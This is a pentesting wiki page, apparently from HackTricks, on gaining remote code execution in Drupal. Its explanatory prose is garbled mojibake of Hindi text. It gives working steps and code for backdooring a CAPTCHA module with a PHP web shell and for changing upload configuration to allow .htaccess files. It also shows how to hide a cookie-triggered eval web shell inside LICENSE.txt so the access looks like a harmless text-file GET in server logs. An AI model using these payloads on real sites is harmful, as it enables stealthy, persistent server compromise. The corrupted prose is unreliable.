# Drupal RCE

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## With PHP Filter Module

{% hint style="warning" %}
рдкреБрд░рд╛рдиреЗ рд╕рдВрд╕реНрдХрд░рдгреЛрдВ рдореЗрдВ Drupal **(рд╕рдВрд╕реНрдХрд░рдг 8 рд╕реЗ рдкрд╣рд▓реЗ)**, рдПрдХ рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ рдХреЗ рд░реВрдк рдореЗрдВ рд▓реЙрдЧ рдЗрди рдХрд░рдирд╛ рдФрд░ **`PHP filter` рдореЙрдбреНрдпреВрд▓ рдХреЛ рд╕рдХреНрд╖рдо рдХрд░рдирд╛** рд╕рдВрднрд╡ рдерд╛, рдЬреЛ "рд╕рдВрд▓рдЧреНрди PHP рдХреЛрдб/рдЯреБрдХрдбрд╝реЛрдВ рдХреЛ рдореВрд▓реНрдпрд╛рдВрдХрд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред" рд▓реЗрдХрд┐рди рд╕рдВрд╕реНрдХрд░рдг 8 рд╕реЗ рдпрд╣ рдореЙрдбреНрдпреВрд▓ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рд╕реНрдерд╛рдкрд┐рдд рдирд╣реАрдВ рд╣реИред
{% endhint %}

рдЖрдкрдХреЛ **рдкреНрд▓рдЧрдЗрди php рд╕реНрдерд╛рдкрд┐рдд рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ** (рдЬрд╛рдБрдЪ рдХрд░реЗрдВ рдХрд┐ _/modules/php_ рдкрд░ рдкрд╣реБрдБрдЪрдХрд░ рдФрд░ рдпрджрд┐ рдпрд╣ **403** рд▓реМрдЯрд╛рддрд╛ рд╣реИ рддреЛ, **рдореМрдЬреВрдж рд╣реИ**, рдпрджрд┐ **рдирд╣реАрдВ рдорд┐рд▓рд╛**, рддреЛ **рдкреНрд▓рдЧрдЗрди php рд╕реНрдерд╛рдкрд┐рдд рдирд╣реАрдВ рд╣реИ**)

_Modules_ рдкрд░ рдЬрд╛рдПрдВ -> (**рдЬрд╛рдБрдЪреЗрдВ**) _PHP Filter_ -> _рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рд╕рд╣реЗрдЬреЗрдВ_

![](<../../../.gitbook/assets/image (247) (1).png>)

рдлрд┐рд░ _Add content_ рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВ -> _Basic Page_ рдпрд╛ _Article_ рдХрд╛ рдЪрдпрди рдХрд░реЗрдВ -> _рд╢рд░реАрд░ рдореЗрдВ php shellcode рд▓рд┐рдЦреЗрдВ_ -> _Text format_ рдореЗрдВ _PHP code_ рдХрд╛ рдЪрдпрди рдХрд░реЗрдВ -> _Preview_ рдХрд╛ рдЪрдпрди рдХрд░реЗрдВ

![](<../../../.gitbook/assets/image (338).png>)

рдЕрдВрдд рдореЗрдВ рдмрд╕ рдирдП рдмрдирд╛рдП рдЧрдП рдиреЛрдб рдкрд░ рдкрд╣реБрдБрдЪреЗрдВ:
```bash
curl http://drupal-site.local/node/3
```
## Install PHP Filter Module

{% hint style="warning" %}
рд╡рд░реНрддрдорд╛рди рд╕рдВрд╕реНрдХрд░рдгреЛрдВ рдореЗрдВ, рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд╕реНрдерд╛рдкрдирд╛ рдХреЗ рдмрд╛рдж рдХреЗрд╡рд▓ рд╡реЗрдм рддрдХ рдкрд╣реБрдБрдЪ рд╣реЛрдиреЗ рдкрд░ рдкреНрд▓рдЧрдЗрдиреНрд╕ рд╕реНрдерд╛рдкрд┐рдд рдХрд░рдирд╛ рдЕрдм рд╕рдВрднрд╡ рдирд╣реАрдВ рд╣реИред
{% endhint %}

рд╕рдВрд╕реНрдХрд░рдг **8 рд╕реЗ рдЖрдЧреЗ,** [**PHP Filter**](https://www.drupal.org/project/php/releases/8.x-1.1) **рдореЙрдбреНрдпреВрд▓ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рд╕реНрдерд╛рдкрд┐рдд рдирд╣реАрдВ рд╣реИ**ред рдЗрд╕ рдХрд╛рд░реНрдпрдХреНрд╖рдорддрд╛ рдХрд╛ рд▓рд╛рдн рдЙрдард╛рдиреЗ рдХреЗ рд▓рд┐рдП, рд╣рдореЗрдВ **рдореЙрдбреНрдпреВрд▓ рдХреЛ рд╕реНрд╡рдпрдВ рд╕реНрдерд╛рдкрд┐рдд рдХрд░рдирд╛ рд╣реЛрдЧрд╛**ред

1. Drupal рд╡реЗрдмрд╕рд╛рдЗрдЯ рд╕реЗ рдореЙрдбреНрдпреВрд▓ рдХрд╛ рд╕рдмрд╕реЗ рд╣рд╛рд▓рд┐рдпрд╛ рд╕рдВрд╕реНрдХрд░рдг рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВред
1. wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz
2. рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рдмрд╛рдж **`Administration`** > **`Reports`** > **`Available updates`** рдкрд░ рдЬрд╛рдПрдВред
3. **`Browse`** рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВ, рдЙрд╕ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рд╕реЗ рдлрд╝рд╛рдЗрд▓ рдХрд╛ рдЪрдпрди рдХрд░реЗрдВ рдЬрд╣рд╛рдБ рд╣рдордиреЗ рдЗрд╕реЗ рдбрд╛рдЙрдирд▓реЛрдб рдХрд┐рдпрд╛ рдерд╛, рдФрд░ рдлрд┐рд░ **`Install`** рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВред
4. рдПрдХ рдмрд╛рд░ рдореЙрдбреНрдпреВрд▓ рд╕реНрдерд╛рдкрд┐рдд рд╣реЛ рдЬрд╛рдиреЗ рдкрд░, рд╣рдо **`Content`** рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ **рдПрдХ рдирдпрд╛ рдмреБрдирд┐рдпрд╛рджреА рдкреГрд╖реНрда рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ**, рдЬреИрд╕реЗ рдХрд┐ рд╣рдордиреЗ Drupal 7 рдЙрджрд╛рд╣рд░рдг рдореЗрдВ рдХрд┐рдпрд╛ рдерд╛ред рдлрд┐рд░ рд╕реЗ, рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░реЗрдВ рдХрд┐ **`Text format`** рдбреНрд░реЙрдкрдбрд╛рдЙрди рд╕реЗ `PHP code` рдХрд╛ рдЪрдпрди рдХрд░реЗрдВред

## Backdoored Module

{% hint style="warning" %}
рд╡рд░реНрддрдорд╛рди рд╕рдВрд╕реНрдХрд░рдгреЛрдВ рдореЗрдВ, рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд╕реНрдерд╛рдкрдирд╛ рдХреЗ рдмрд╛рдж рдХреЗрд╡рд▓ рд╡реЗрдм рддрдХ рдкрд╣реБрдБрдЪ рд╣реЛрдиреЗ рдкрд░ рдкреНрд▓рдЧрдЗрдиреНрд╕ рд╕реНрдерд╛рдкрд┐рдд рдХрд░рдирд╛ рдЕрдм рд╕рдВрднрд╡ рдирд╣реАрдВ рд╣реИред
{% endhint %}

рдПрдХ рдмреИрдХрдбреЛрд░ рдореЙрдбреНрдпреВрд▓ **рдПрдХ рдореМрдЬреВрджрд╛ рдореЙрдбреНрдпреВрд▓ рдореЗрдВ рд╢реЗрд▓ рдЬреЛрдбрд╝рдХрд░** рдмрдирд╛рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдореЙрдбреНрдпреВрд▓ drupal.org рд╡реЗрдмрд╕рд╛рдЗрдЯ рдкрд░ рдкрд╛рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВред рдЪрд▓рд┐рдП [CAPTCHA](https://www.drupal.org/project/captcha) рдЬреИрд╕реЗ рдПрдХ рдореЙрдбреНрдпреВрд▓ рдХрд╛ рдЪрдпрди рдХрд░рддреЗ рд╣реИрдВред рдиреАрдЪреЗ рд╕реНрдХреНрд░реЙрд▓ рдХрд░реЗрдВ рдФрд░ tar.gz [archive](https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz) рдХреЗ рд▓рд┐рдП рд▓рд┐рдВрдХ рдХреЙрдкреА рдХрд░реЗрдВред

* рд╕рдВрдЧреНрд░рд╣ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ рдФрд░ рдЗрд╕рдХреА рд╕рд╛рдордЧреНрд░реА рдирд┐рдХрд╛рд▓реЗрдВред
```
wget --no-check-certificate  https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
tar xvf captcha-8.x-1.2.tar.gz
```
* рдПрдХ **PHP рд╡реЗрдм рд╢реЗрд▓** рдмрдирд╛рдПрдВ рдЬрд┐рд╕рдореЗрдВ рд╕рд╛рдордЧреНрд░реА рд╣реЛ:
```php
<?php
system($_GET["cmd"]);
?>
```
* рдЕрдЧрд▓рд╛, рд╣рдореЗрдВ **`.htaccess`** рдлрд╝рд╛рдЗрд▓ рдмрдирд╛рдиреА рд╣реЛрдЧреА рддрд╛рдХрд┐ рд╣рдо рдлрд╝реЛрд▓реНрдбрд░ рддрдХ рдкрд╣реБрдБрдЪ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХреЗрдВред рдпрд╣ рдЖрд╡рд╢реНрдпрдХ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ Drupal **`/modules`** рдлрд╝реЛрд▓реНрдбрд░ рддрдХ рд╕реАрдзреЗ рдкрд╣реБрдБрдЪ рдХреЛ рдЕрд╕реНрд╡реАрдХрд╛рд░ рдХрд░рддрд╛ рд╣реИред
```html
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
</IfModule>
```
* рдЙрдкрд░реЛрдХреНрдд рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди /modules рдореЗрдВ рдлрд╝рд╛рдЗрд▓ рдХрд╛ рдЕрдиреБрд░реЛрдз рдХрд░рддреЗ рд╕рдордп / рдлрд╝реЛрд▓реНрдбрд░ рдХреЗ рд▓рд┐рдП рдирд┐рдпрдо рд▓рд╛рдЧреВ рдХрд░реЗрдЧрд╛ред рдЗрди рджреЛрдиреЛрдВ рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЛ рдХреИрдкреНрдЪрд╛ рдлрд╝реЛрд▓реНрдбрд░ рдореЗрдВ рдХреЙрдкреА рдХрд░реЗрдВ рдФрд░ рдПрдХ рд╕рдВрдЧреНрд░рд╣ рдмрдирд╛рдПрдБред
```bash
mv shell.php .htaccess captcha
tar cvf captcha.tar.gz captcha/
```
* рдорд╛рди рд▓реАрдЬрд┐рдП рдХрд┐ рд╣рдорд╛рд░реЗ рдкрд╛рд╕ **рдкреНрд░рд╢рд╛рд╕рдирд┐рдХ рдкрд╣реБрдВрдЪ** рд╣реИ рд╡реЗрдмрд╕рд╛рдЗрдЯ рдкрд░, **`Manage`** рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВ рдФрд░ рдлрд┐рд░ рд╕рд╛рдЗрдбрдмрд╛рд░ рдореЗрдВ **`Extend`** рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВред рдЕрдЧрд▓рд╛, **`+ Install new module`** рдмрдЯрди рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВ, рдФрд░ рд╣рдореЗрдВ рдЗрдВрд╕реНрдЯреЙрд▓реЗрд╢рди рдкреГрд╖реНрда рдкрд░ рд▓реЗ рдЬрд╛рдпрд╛ рдЬрд╛рдПрдЧрд╛, рдЬреИрд╕реЗ `http://drupal-site.local/admin/modules/install` рдмреИрдХрдбреЛрд░ рдХрд┐рдП рдЧрдП рдХреИрдкреНрдЪрд╛ рд╕рдВрдЧреНрд░рд╣ рдкрд░ рдЬрд╛рдПрдВ рдФрд░ **`Install`** рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВред
* рдПрдХ рдмрд╛рд░ рдЗрдВрд╕реНрдЯреЙрд▓реЗрд╢рди рд╕рдлрд▓ рд╣реЛрдиреЗ рдХреЗ рдмрд╛рдж, **`/modules/captcha/shell.php`** рдкрд░ рдЬрд╛рдПрдВ рддрд╛рдХрд┐ рдХрдорд╛рдВрдб рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░ рд╕рдХреЗрдВред

## Drupal рдХреЛ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рд╕рдордиреНрд╡рдп рдХреЗ рд╕рд╛рде рдмреИрдХрдбреЛрд░ рдХрд░рдирд╛ <a href="#backdooring-drupal" id="backdooring-drupal"></a>

**рдкреЛрд╕реНрдЯ рд╕рд╛рдЭрд╛ рдХреА рдЧрдИ** [**Coiffeur0x90**](https://twitter.com/Coiffeur0x90)

### рднрд╛рдЧ 1 (_Media_ рдФрд░ _Media Library_ рдХрд╛ рд╕рдХреНрд░рд┐рдпрдг)

_Extend_ рдореЗрдиреВ (/admin/modules) рдореЗрдВ, рдЖрдк рдЙрди рдкреНрд▓рдЧрдЗрдиреНрд╕ рдХреЛ рд╕рдХреНрд░рд┐рдп рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ рдкрд╣рд▓реЗ рд╕реЗ рд╕реНрдерд╛рдкрд┐рдд рдкреНрд░рддреАрдд рд╣реЛрддреЗ рд╣реИрдВред рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ, рдкреНрд▓рдЧрдЗрдиреНрд╕ _Media_ рдФрд░ _Media Library_ рд╕рдХреНрд░рд┐рдп рдирд╣реАрдВ рд╣реЛрддреЗ рд╣реИрдВ, рдЗрд╕рд▓рд┐рдП рдЪрд▓рд┐рдП рдЗрдиреНрд╣реЗрдВ рд╕рдХреНрд░рд┐рдп рдХрд░рддреЗ рд╣реИрдВред

рд╕рдХреНрд░рд┐рдпрдХрд░рдг рд╕реЗ рдкрд╣рд▓реЗ:

<figure><img src="../../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

рд╕рдХреНрд░рд┐рдпрдХрд░рдг рдХреЗ рдмрд╛рдж:

<figure><img src="../../../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>

### рднрд╛рдЧ 2 (_Configuration synchronization_ рдлреАрдЪрд░ рдХрд╛ рд▓рд╛рдн рдЙрдард╛рдирд╛) <a href="#part-2-leveraging-feature-configuration-synchronization" id="part-2-leveraging-feature-configuration-synchronization"></a>

рд╣рдо _Configuration synchronization_ рдлреАрдЪрд░ рдХрд╛ рд▓рд╛рдн рдЙрдард╛рдХрд░ Drupal рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдкреНрд░рд╡рд┐рд╖реНрдЯрд┐рдпреЛрдВ рдХреЛ рдбрдВрдк (рдирд┐рд░реНрдпрд╛рдд) рдФрд░ рдЕрдкрд▓реЛрдб (рдЖрдпрд╛рдд) рдХрд░реЗрдВрдЧреЗ:

* /admin/config/development/configuration/single/export
* /admin/config/development/configuration/single/import

**Patch system.file.yml**

рдЖрдЗрдП рдкрд╣рд▓реЗ рдкреНрд░рд╡рд┐рд╖реНрдЯрд┐ `allow_insecure_uploads` рдХреЛ рдкреИрдЪ рдХрд░рдирд╛ рд╢реБрд░реВ рдХрд░реЗрдВ:

File: system.file.yml
```

...

allow_insecure_uploads: false

...

```
<figure><img src="../../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>

рдХреЗ рд▓рд┐рдП:

рдлрд╛рдЗрд▓: system.file.yml
```

...

allow_insecure_uploads: true

...

```
<figure><img src="../../../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>

**Patch field.field.media.document.field\_media\_document.yml**

рдлрд┐рд░, рджреВрд╕рд░реЗ рдкреНрд░рд╡рд┐рд╖реНрдЯрд┐ `file_extensions` рдХреЛ рдЗрд╕ рдкреНрд░рдХрд╛рд░ рдкреИрдЪ рдХрд░реЗрдВ:

File: field.field.media.document.field\_media\_document.yml
```

...

file_directory: '[date:custom:Y]-[date:custom:m]'
file_extensions: 'txt rtf doc docx ppt pptx xls xlsx pdf odf odg odp ods odt fodt fods fodp fodg key numbers pages'

...
```
<figure><img src="../../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

рдХреЗ рд▓рд┐рдП:

рдлрд╛рдЗрд▓: field.field.media.document.field\_media\_document.yml
```
...

file_directory: '[date:custom:Y]-[date:custom:m]'
file_extensions: 'htaccess txt rtf doc docx ppt pptx xls xlsx pdf odf odg odp ods odt fodt fods fodp fodg key numbers pages'

...

```
> рдореИрдВ рдЗрд╕реЗ рдЗрд╕ рдмреНрд▓реЙрдЧрдкреЛрд╕реНрдЯ рдореЗрдВ рдЙрдкрдпреЛрдЧ рдирд╣реАрдВ рдХрд░рддрд╛ рд▓реЗрдХрд┐рди рдпрд╣ рдиреЛрдЯ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рдХрд┐ рдЗрд╕реЗ рдордирдорд╛рдиреЗ рддрд░реАрдХреЗ рд╕реЗ `file_directory` рдкреНрд░рд╡рд┐рд╖реНрдЯрд┐ рдХреЛ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИ рдФрд░ рдпрд╣ рдПрдХ рдкрде traversal рд╣рдорд▓реЗ рдХреЗ рд▓рд┐рдП рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рд╣реИ (рдЗрд╕рд▓рд┐рдП рд╣рдо Drupal рдлрд╝рд╛рдЗрд▓ рд╕рд┐рд╕реНрдЯрдо рдкреЗрдбрд╝ рдХреЗ рднреАрддрд░ рд╡рд╛рдкрд╕ рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВ)ред

<figure><img src="../../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

### рднрд╛рдЧ 3 (рд╡рд┐рд╢реЗрд╖рддрд╛ _Add Document_ рдХрд╛ рд▓рд╛рдн рдЙрдард╛рдирд╛) <a href="#part-3-leveraging-feature-add-document" id="part-3-leveraging-feature-add-document"></a>

рдЕрдВрддрд┐рдо рдЪрд░рдг рд╕рдмрд╕реЗ рд╕рд░рд▓ рд╣реИ, рдФрд░ рдЗрд╕реЗ рджреЛ рдЙрдк-рдЪрд░рдгреЛрдВ рдореЗрдВ рд╡рд┐рднрд╛рдЬрд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред рдкрд╣рд▓рд╛ рд╣реИ .htaccess рдкреНрд░рд╛рд░реВрдк рдореЗрдВ рдПрдХ рдлрд╝рд╛рдЗрд▓ рдЕрдкрд▓реЛрдб рдХрд░рдирд╛ рддрд╛рдХрд┐ Apache рдирд┐рд░реНрджреЗрд╢реЛрдВ рдХрд╛ рд▓рд╛рдн рдЙрдард╛рдпрд╛ рдЬрд╛ рд╕рдХреЗ рдФрд░ .txt рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЛ PHP рдЗрдВрдЬрди рджреНрд╡рд╛рд░рд╛ рд╡реНрдпрд╛рдЦреНрдпрд╛рдпрд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреА рдЬрд╛ рд╕рдХреЗред рджреВрд╕рд░рд╛ рд╣реИ рд╣рдорд╛рд░реА рдкреЗрд▓реЛрдб рд╡рд╛рд▓реА .txt рдлрд╝рд╛рдЗрд▓ рдЕрдкрд▓реЛрдб рдХрд░рдирд╛ред

File: .htaccess
```
<Files *>
SetHandler application/x-httpd-php
</Files>

# Vroum! Vroum!
# We reactivate PHP engines for all versions in order to be targetless.
<IfModule mod_php.c>
php_flag engine on
</IfModule>
<IfModule mod_php7.c>
php_flag engine on
</IfModule>
<IfModule mod_php5.c>
php_flag engine on
</IfModule>
```
рдХреНрдпреЛрдВ рдпрд╣ рдЯреНрд░рд┐рдХ рдХреВрд▓ рд╣реИ?

рдХреНрдпреЛрдВрдХрд┐ рдПрдХ рдмрд╛рд░ рдЬрдм Webshell (рдЬрд┐рд╕реЗ рд╣рдо LICENSE.txt рдХрд╣реЗрдВрдЧреЗ) рд╡реЗрдм рд╕рд░реНрд╡рд░ рдкрд░ рдбреНрд░реЙрдк рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рд╣рдо рдЕрдкрдиреЗ рдХрдорд╛рдВрдб `$_COOKIE` рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рднреЗрдЬ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рд╡реЗрдм рд╕рд░реНрд╡рд░ рд▓реЙрдЧ рдореЗрдВ, рдпрд╣ рдПрдХ рд╡реИрдз GET рдЕрдиреБрд░реЛрдз рдХреЗ рд░реВрдк рдореЗрдВ рдПрдХ рдЯреЗрдХреНрд╕реНрдЯ рдлрд╝рд╛рдЗрд▓ рдХреЗ рд▓рд┐рдП рджрд┐рдЦрд╛рдИ рджреЗрдЧрд╛ред

рд╣рдорд╛рд░реЗ Webshell рдХрд╛ рдирд╛рдо LICENSE.txt рдХреНрдпреЛрдВ рд░рдЦрд╛ рдЬрд╛рдП?

рд╕рд┐рд░реНрдл рдЗрд╕рд▓рд┐рдП рдХреНрдпреЛрдВрдХрд┐ рдпрджрд┐ рд╣рдо рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдлрд╝рд╛рдЗрд▓ рд▓реЗрддреЗ рд╣реИрдВ, рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП [core/LICENSE.txt](https://github.com/drupal/drupal/blob/11.x/core/LICENSE.txt) (рдЬреЛ рдкрд╣рд▓реЗ рд╕реЗ рд╣реА Drupal рдХреЛрд░ рдореЗрдВ рдореМрдЬреВрдж рд╣реИ), рддреЛ рд╣рдорд╛рд░реЗ рдкрд╛рд╕ 339 рд▓рд╛рдЗрдиреЛрдВ рдФрд░ 17.6 KB рдЖрдХрд╛рд░ рдХреА рдПрдХ рдлрд╝рд╛рдЗрд▓ рд╣реИ, рдЬреЛ рдмреАрдЪ рдореЗрдВ рдПрдХ рдЫреЛрдЯрд╛ PHP рдХреЛрдб рд╕реНрдирд┐рдкреЗрдЯ рдЬреЛрдбрд╝рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХрджрдо рд╕рд╣реА рд╣реИ (рдХреНрдпреЛрдВрдХрд┐ рдлрд╝рд╛рдЗрд▓ рдХрд╛рдлреА рдмрдбрд╝реА рд╣реИ)ред

<figure><img src="../../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

рдлрд╝рд╛рдЗрд▓: рдкреИрдЪ рдХрд┐рдпрд╛ рдЧрдпрд╛ LICENSE.txt
```txt

...

this License, you may choose any version ever published by the Free Software
Foundation.

<?php

# We inject our payload into the cookies so that in the logs of the compromised
# server it shows up as having been requested via the GET method, in order to
# avoid raising suspicions.
if (isset($_COOKIE["89e127753a890d9c4099c872704a0711bbafbce9"])) {
if (!empty($_COOKIE["89e127753a890d9c4099c872704a0711bbafbce9"])) {
eval($_COOKIE["89e127753a890d9c4099c872704a0711bbafbce9"]);
} else {
phpinfo();
}
}

?>

10. If you wish to incorporate parts of the Program into other free
programs whose distribution conditions are different, write to the author

...

```
#### **рднрд╛рдЧ 3.1 (рдлрд╛рдЗрд▓ .htaccess рдЕрдкрд▓реЛрдб рдХрд░реЗрдВ)**

рдкрд╣рд▓реЗ, рд╣рдо _Add Document_ (/media/add/document) рд╕реБрд╡рд┐рдзрд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЕрдкрдиреА рдлрд╛рдЗрд▓ рдЕрдкрд▓реЛрдб рдХрд░рддреЗ рд╣реИрдВ рдЬрд┐рд╕рдореЗрдВ Apache рдирд┐рд░реНрджреЗрд╢ (.htaccess) рд╣реЛрддреЗ рд╣реИрдВред

<figure><img src="../../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

**рднрд╛рдЧ 3.2 (рдлрд╛рдЗрд▓ LICENSE.txt рдЕрдкрд▓реЛрдб рдХрд░реЗрдВ)**

рдлрд┐рд░, рд╣рдо _Add Document_ (/media/add/document) рд╕реБрд╡рд┐рдзрд╛ рдХрд╛ рдлрд┐рд░ рд╕реЗ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рдПрдХ рд▓рд╛рдЗрд╕реЗрдВрд╕ рдлрд╛рдЗрд▓ рдХреЗ рднреАрддрд░ рдЫрд┐рдкрд╛ рд╣реБрдЖ Webshell рдЕрдкрд▓реЛрдб рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗред

<figure><img src="../../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>

### рднрд╛рдЧ 4 (Webshell рдХреЗ рд╕рд╛рде рдЗрдВрдЯрд░реИрдХреНрд╢рди) <a href="#part-4-interaction-with-the-webshell" id="part-4-interaction-with-the-webshell"></a>

рдЕрдВрддрд┐рдо рднрд╛рдЧ Webshell рдХреЗ рд╕рд╛рде рдЗрдВрдЯрд░реИрдХреНрдЯ рдХрд░рдиреЗ рдХрд╛ рд╣реИред

рдЬреИрд╕рд╛ рдХрд┐ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╕реНрдХреНрд░реАрдирд╢реЙрдЯ рдореЗрдВ рджрд┐рдЦрд╛рдпрд╛ рдЧрдпрд╛ рд╣реИ, рдпрджрд┐ рд╣рдорд╛рд░реЗ Webshell рджреНрд╡рд╛рд░рд╛ рдЕрдкреЗрдХреНрд╖рд┐рдд рдХреБрдХреА рдкрд░рд┐рднрд╛рд╖рд┐рдд рдирд╣реАрдВ рд╣реИ, рддреЛ рд╣рдореЗрдВ рд╡реЗрдм рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдлрд╛рдЗрд▓ рдкрд░ рдкрд░рд╛рдорд░реНрд╢ рдХрд░рддреЗ рд╕рдордп рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдкрд░рд┐рдгрд╛рдо рдорд┐рд▓рддрд╛ рд╣реИред

<figure><img src="../../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>

рдЬрдм рд╣рдорд▓рд╛рд╡рд░ рдХреБрдХреА рд╕реЗрдЯ рдХрд░рддрд╛ рд╣реИ, рддреЛ рд╡рд╣ Webshell рдХреЗ рд╕рд╛рде рдЗрдВрдЯрд░реИрдХреНрдЯ рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдЬреЛ рдЪрд╛рд╣реЗрдВ рдХрдорд╛рдВрдб рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░ рд╕рдХрддрд╛ рд╣реИред

<figure><img src="../../../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>

рдФрд░ рдЬреИрд╕рд╛ рдХрд┐ рдЖрдк рд▓реЙрдЧ рдореЗрдВ рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ, рдРрд╕рд╛ рд▓рдЧрддрд╛ рд╣реИ рдХрд┐ рдХреЗрд╡рд▓ рдПрдХ txt рдлрд╛рдЗрд▓ рдХрд╛ рдЕрдиреБрд░реЛрдз рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред

<figure><img src="../../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>

рдЗрд╕ рд▓реЗрдЦ рдХреЛ рдкрдврд╝рдиреЗ рдХреЗ рд▓рд┐рдП рдзрдиреНрдпрд╡рд╛рдж, рдореБрдЭреЗ рдЙрдореНрдореАрдж рд╣реИ рдХрд┐ рдпрд╣ рдЖрдкрдХреЛ рдХреБрдЫ рд╢реЗрд▓ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдореЗрдВ рдорджрдж рдХрд░реЗрдЧрд╛ред

{% hint style="success" %}
